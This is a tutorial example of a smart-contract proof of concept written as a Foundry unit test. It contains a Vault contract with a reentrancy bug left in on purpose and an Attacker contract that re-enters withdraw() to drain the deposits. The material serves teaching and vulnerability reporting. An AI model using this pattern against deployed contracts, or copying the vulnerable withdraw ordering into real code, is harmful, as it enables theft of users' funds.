# Example: Reentrancy PoC (Foundry Unit Test)

This example demonstrates writing a PoC as a **Foundry unit test** — the preferred
test-case approach for smart contract vulnerabilities. It shows section header comments,
monetary impact logging, and an attacker contract pattern.

**Scenario:** A Vault contract sends ETH via a low-level `call` before updating the
sender's balance, allowing reentrancy to drain deposited funds.

**Approach:** Poly-flow Foundry unit test with attacker contract.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title  Theft of deposited funds via reentrancy in Vault.withdraw()
 * @notice Affected: Vault.sol (withdraw function, line 42)
 *         Impact:   Drain all ETH deposited by other users
 *         Author:   researcher
 */
contract VaultReentrancyPoC is Test {
    Vault public vault;
    Attacker public attacker;

    // == [ Set Up ] ==

    function setUp() public {
        vault = new Vault();

        // Simulate existing deposits from other users
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 10 ether}();

        // Fund attacker with minimal capital
        attacker = new Attacker(vault);
        vm.deal(address(attacker), 1 ether);
    }

    // == [ Execute Exploit ] ==

    function testReentrancy() public {
        uint256 vaultBefore = address(vault).balance;     // 10 ETH (other users)
        uint256 attackerBefore = address(attacker).balance; // 1 ETH (seed capital)

        console.log("Vault balance before:    %s wei", vaultBefore);
        console.log("Attacker balance before: %s wei", attackerBefore);

        attacker.attack{value: 1 ether}();

        // == [ Verify Impact ] ==

        uint256 vaultAfter = address(vault).balance;
        uint256 attackerAfter = address(attacker).balance;
        uint256 profit = attackerAfter - attackerBefore;

        console.log("Vault balance after:     %s wei", vaultAfter);
        console.log("Attacker balance after:  %s wei", attackerAfter);
        console.log("Attacker profit:         %s wei", profit);

        // Vault should be drained; attacker should have more than they started with
        assertEq(vaultAfter, 0, "Vault not fully drained");
        assertGt(attackerAfter, attackerBefore, "Attacker did not profit");
    }
}

contract Attacker {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

// Minimal vulnerable vault for illustration — in a real PoC this would be
// the actual target contract imported from the project.
contract Vault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
        balances[msg.sender] = 0; // state update after external call — the bug
    }
}
```

## Why This PoC Works

- **Test-case integration.** Written as a Foundry test — `forge test -vv` runs it and
  the test passing means the exploit succeeded. No manual interpretation needed.
- **Section comments.** `// == [ Set Up ] ==`, `// == [ Execute Exploit ] ==`,
  `// == [ Verify Impact ] ==` let reviewers skim the structure at a glance.
- **Monetary impact demonstrated.** Logs vault and attacker balances before and after,
  calculates profit. A triager sees concrete ETH amounts, not an abstract claim.
- **Benign.** Runs entirely in the Foundry VM. No mainnet transactions, no real funds
  at risk. The attacker contract and vault are self-contained.
- **Clear output.** `console.log` shows the exploit narrative; `assertEq` / `assertGt`
  enforce the expected outcome. Failure messages explain what went wrong.
- **Minimum viable proof.** One deposit, one withdraw with reentrance, one assertion.
  No unnecessary steps or optimizations.
